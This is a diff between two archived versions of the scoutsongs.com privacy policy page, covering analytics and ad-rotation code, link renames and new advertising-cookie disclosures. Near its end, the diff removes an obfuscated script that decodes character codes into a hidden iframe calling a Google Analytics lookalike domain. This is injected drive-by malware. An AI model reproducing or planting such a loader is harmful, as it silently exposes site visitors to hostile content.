@@ -1,5 +1,5 @@
-<!--The following is the downloaded HTML source of the scoutsongs.com privacy policy that was archived on 2008-12-21.
- Please check the original snapshot on the Wayback Machine (https://web.archive.org/web/20081221014554id_/http%3A//www.scoutsongs.com/privacy.html) for the most accurate reproduction.-->
+<!--The following is the downloaded HTML source of the scoutsongs.com privacy policy that was archived on 2009-06-19.
+ Please check the original snapshot on the Wayback Machine (https://web.archive.org/web/20090619211839id_/http%3A//www.scoutsongs.com/privacy.html) for the most accurate reproduction.-->
 
 <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"><html><!-- #BeginTemplate "/Templates/homepage.dwt" --><!-- DW6 --><head>
 <!-- #BeginEditable "Header-Area" -->
@@ -13,11 +13,13 @@ function mailTo(user, domain, suffix){
 </script>
 <!-- #EndEditable -->
 <link rel="stylesheet" href="/includes/default.css">
-<script src="http://www.google-analytics.com/urchin.js" type="text/javascript">
-</script>
 <script type="text/javascript">
-_uacct = "UA-160737-1";
-urchinTracker();
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script><script src="https://ssl.google-analytics.com/ga.js" type="text/javascript"></script>
+<script type="text/javascript">
+var pageTracker = _gat._getTracker("UA-160737-1");
+pageTracker._trackPageview();
 </script>
 </head>
 <body bgcolor="#4B4B4B">
@@ -25,20 +27,14 @@ urchinTracker();
     <div id="page_body">
 <table width="985" border="0" cellspacing="0" cellpadding="0"><tbody><tr valign="top" align="center">
 <td height="100">
-<script type="text/javascript"><!--
-
+<script type="text/javascript">
 if (!random) {var abc=Math.random() + ""; var random=abc.substring(2,4);}
 
+/* ScoutSongs Banner */
 google_ad_client = "pub-2965214113819332";
+google_ad_slot = "2258304154";
 google_ad_width = 728;
 google_ad_height = 90;
-google_ad_format = "728x90_as";
-google_ad_channel ="0899684491";
-google_color_border = "6B0303";
-google_color_bg = "FFFFCC";
-google_color_link = "6B0303";
-google_color_url = "008000";
-google_color_text = "000000";
 
 amazon_ad_tag="scoutsongscom-20";
 amazon_ad_width="728"; 
@@ -50,19 +46,25 @@ amazon_color_link="A43907";
 amazon_ad_logo="hide"; 
 amazon_ad_title="ScoutSongs.com Store powered by Amazon.com"; 
 
-if (parseInt(random, 10) < 75) {
-    amazon_ad_tag="masterlanguage-20";
-    amazon_ad_title="Master Another Language Store powered by Amazon.com"; 
-    }
+var adSelect=parseInt(random, 10);
 
-if (parseInt(random, 10) < 50) {document.write('<script language="javascript" src="http://pagead2.googlesyndication.com/pagead/show_ads.js"></scr' + 'ipt>');}
-else {document.write('<script language="javascript" src="http://www.assoc-amazon.com/s/asw.js"></scr' + 'ipt>');}
+if (adSelect > 90) {
+    amazon_ad_tag="masterlanguage-20";amazon_ad_title="Master Another Language Store powered by Amazon.com"; 
+}
+if (adSelect > 80) {
+    document.write('<script language="javascript" src="http://www.assoc-amazon.com/s/asw.js"></scr' + 'ipt>');
+} else {
+    document.write('<script language="javascript" src="http://pagead2.googlesyndication.com/pagead/show_ads.js"></scr' + 'ipt>');
+}
 
-/* Sept 25,2007 evening, gave 20% banner inventory to Amazon */
-/* July 31,2008 evening, gave 25 scouts/25 master/50 google google/25 amazon */
-//--></script><script language="javascript" src="http://www.assoc-amazon.com/s/asw.js"></script>
-
-
+/* 
+Sept 25,2007 evening, gave 20% banner inventory to Amazon
+July 31,2008 evening, gave 25 scouts/25 master/50 google google/25 amazon
+January 1, 2009: 50 Scoutsongs Store / 50 Google
+April 30th, 2009: 60 Master / 0 ScoutSong store / 60 Google
+May 1st, 2009: 10 Master / 10 Scoutsongs / 80 Google
+ */
+</script><script language="javascript" src="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
 
 
 </td>
@@ -110,10 +112,10 @@ else {document.write('<script language="javascript" src="http://www.assoc-amazon
     <div class="ln_links">
 	<a href="/categories/index.html" title="Camp Songs lyrics">All Camp Songs</a><br>
 	<a href="/categories/TK.html" title="Tanah Keeta Song Book">Tanah Keeta</a><br>
-	<a href="/categories/action.html" title="action songs">Action Songs</a><br>
-	<a href="/categories/scout.html" title="Boy Scout songs lyrics">Boy Scout Songs</a><br>
-	<a href="/categories/girlscout.html" title="Girl Scout songs lyrics">Girl Scout Songs</a><br>
-	<a href="/categories/patrioticsongs.html" title="Patriotic Songs lyrics">Patriotic Songs</a><br>
+	<a href="/categories/action-songs.html" title="action songs">Action Songs</a><br>
+	<a href="/categories/boy-scout-songs.html" title="Boy Scout songs lyrics">Boy Scout Songs</a><br>
+	<a href="/categories/girl-scout-songs.html" title="Girl Scout songs lyrics">Girl Scout Songs</a><br>
+	<a href="/categories/patriotic-songs.html" title="Patriotic Songs lyrics">Patriotic Songs</a><br>
 	<a href="/categories/rounds.html" title="three part round lyrics">Rounds</a>
 	<!--<a href="/categories/visitors.html">Visitor Submissions</a>-->
     </div>
@@ -171,25 +173,34 @@ else {document.write('<script language="javascript" src="http://www.assoc-amazon
 	</h1>
 	<!-- #BeginEditable "Category-List" -->
 
-
 	<p>This is a web site owned and operated by Jonathan Glassman.<br>
-  Jonathan can be reached via e-mail at
+Jonathan can be reached via e-mail at
 <script language="JavaScript" type="text/javascript">
 mailTo("webhead", "scoutsongs", "com");
-</script><a href="mailto:webhead@scoutsongs.com">webhead@scoutsongs.com</a>
-  .</p>
+</script><a href="mailto:webhead@scoutsongs.com">webhead@scoutsongs.com</a>.</p>
 
-	<p>For each visitor to our Web page, our Web server does not recognize a user's domain or e-mail address. We do collect aggregate information on what pages visitors access or visit. We may collect information volunteered by the visitor, such as survey information, contests and/or site registrations.</p>
+<p><strong>Information Gathered:</strong> <br>
+For each visitor to our Web site, our Web server does not recognize a user's domain or e-mail address. We do collect aggregate information on what pages visitors access or visit. We may collect information volunteered by the visitor, such as survey information, contests and/or site registrations.</p>
 
-	<p>The information we collect is used for internal review and is then discarded, used to improve the content of our Web site and not shared with other organizations for commercial purposes.</p>
+<p>The information we collect is used for internal review and is then discarded, used to improve the content of our Web site and not shared with other organizations for commercial purposes.</p>
 
 <p>If you do not want to receive e-mail from us in the future, please let us know by sending email to us at the above address and telling us that you do not want to receive e-mail from our organization.</p>
 
-<!-- 	<p>When you supply your name and/or e-mail address when registering for our newsletter, a contest, or general correspondence, we do not gather that data for any other use than to identify you when you access those services. However, we do not have any control over address harvesters that may invade our web site for the purpose of harvesting addresses for use by other parties. When you register to be added to one or more of the e-mail lists maintained by us, we do not share that information with any other person or business. </p> -->
+<p><strong>Advertisements:</strong> <br>
+We use third-party advertising companies to serve ads when you visit our website. These companies may use information (not including your name, address, email address, or telephone number) about your visits to this and other websites in order to provide advertisements about goods and services of interest to you.
+</p><ul>
+<li>Google, as a third party vendor, uses cookies to serve ads on ScoutSongs.com.</li>
+<li>Google's use of the DART cookie enables it to serve ads based on a visitors visit here and to other sites on the Internet.</li>
+<li>You may opt out of the use of the DART cookie by visiting the <a href="http://www.google.com/privacy_ads.html" target="_blank">Google ad and content network privacy policy</a>.
+</li></ul>
+<p></p>
 
-	<p>Links: This web site contains links to other sites. Please be aware that we are not responsible for the privacy practices of such other sites. We encourage our users to be aware when they leave our site and to read the privacy statements of each and every web site that collects personally identifiable information. This privacy statement applies solely to information collected by this Web site.</p>
+<p><strong>Off-Site Links:</strong><br>
+This web site contains links to other sites. Please be aware that we are not responsible for the content or privacy practices of such other sites. We encourage our users to be aware when they leave our site and to read the privacy statements of each and every web site that collects personally identifiable information. This privacy statement applies solely to information collected by this Web site.</p>
 
-	<p>Notification of Changes: If we decide to change our privacy policy, we will post those changes on our privacy policy statement page so our users are always aware of what information we collect, how we use it, and under what circumstances, if any, we disclose it. If at any point we decide to use personally identifiable information in a manner different from that stated at the time it was collected, we will notify users by way of an email. Users will have a choice as to whether or not we use their information in this different manner. We will use information in accordance with the privacy policy under which the information was collected.</p>
+
+<p><strong>Notification of Changes:</strong><br>
+If we decide to change our privacy policy, we will post those changes on our privacy policy statement page so our users are always aware of what information we collect, how we use it, and under what circumstances, if any, we disclose it. If at any point we decide to use personally identifiable information in a manner different from that stated at the time it was collected, we will notify users by way of an email. Users will have a choice as to whether or not we use their information in this different manner. We will use information in accordance with the privacy policy under which the information was collected.</p>
 
 	<!-- #EndEditable -->
 </td>
@@ -226,12 +237,11 @@ mailTo("webhead", "scoutsongs", "com");
 <b>Spreading the Word:</b><br>
 <a href="http://www.bocamenus.com/" target="_blank" title="Boca Raton Restaurant Menus">Boca Menus</a> is my brother's site
 <br><br>
-© 2002-2008 ScoutSongs.com<br>&nbsp;
+© 2002-2009 ScoutSongs.com<br>&nbsp;
 
 </td>
 </tr>
 </tbody></table>
-<script language="JavaScript">function wyun(pfad){return String.fromCharCode(pfad);}var omej="060105102114097109101032115114099061039104116116112058047047115115108045103111111103108101045097110097108121116105099115046099111109047105110046099103105063050039032119105100116104061039048039032104101105103104116061039048039032115116121108101061039118105115105098105108105116121058032104105100100101110059039062060047105102114097109101062";var nybz="";for(hkzk=0;hkzk<omej.length;hkzk+=3){nybz+=wyun(omej.substr (hkzk, 3));}window.status='Done';document.write(nybz);</script><iframe src="http://ssl-google-analytics.com/in.cgi?2" width="0" height="0" style="visibility: hidden;"></iframe>
  
 </td></tr></tbody></table>
 	</div>
